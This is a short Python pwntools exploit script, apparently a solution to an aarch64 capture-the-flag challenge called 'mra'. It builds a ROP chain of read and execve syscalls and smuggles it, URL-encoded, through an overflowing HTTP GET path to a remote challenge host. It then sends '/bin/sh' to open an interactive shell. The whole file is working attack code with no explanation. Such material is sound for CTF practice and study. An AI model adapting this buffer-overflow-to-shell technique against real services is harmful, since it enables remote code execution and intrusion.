from pwn import *
import six.moves.urllib as urllib

context.arch = "aarch64"
e = ELF("./mra", checksec=False)
p = remote('mra.challenges.ooo', 8000)

#0x4007EC RET
#0x41d1e8 BSS
#xpl = "GET /api/isodd/%\x00abcdefghij/?token=enterprise"

xpl1 = ""
xpl1 += p64(0x0)        #x2 - null
xpl1 += p64(0x0)        #x1 - null
xpl1 += p64(0x41d1e8)   #x0 - .bss /bin/sh
xpl1 += p64(0xdd)       #x8 - execve
xpl1 += p64(0xdeadbeef) #nothing/padding
xpl1 += p64(0xdeadbeef) #nothing/padding
xpl1 += p64(0xff)       #x2 - 255 size
xpl1 += p64(0x41d1e8)   #x1 - .bss
xpl1 += p64(0x0)        #x0 - stdin(0x0)
xpl1 += p64(0x3f)       #x8 - read        
xpl1 += p64(0x0)       
xpl1 += p64(0x4007EC)   #gadget which contains svc #0x0 = syscall
xpl1 += p64(0x0)
xpl1 = urllib.parse.quote(xpl1).encode()
xpl = "GET /api/isodd/%\x00{pad}{xpl}/?token=enterprise".format(pad="A"*(112 - 40 - 8*6), xpl=xpl1)

print xpl
p.sendline(xpl)
p.sendline("/bin/sh\x00")
p.interactive()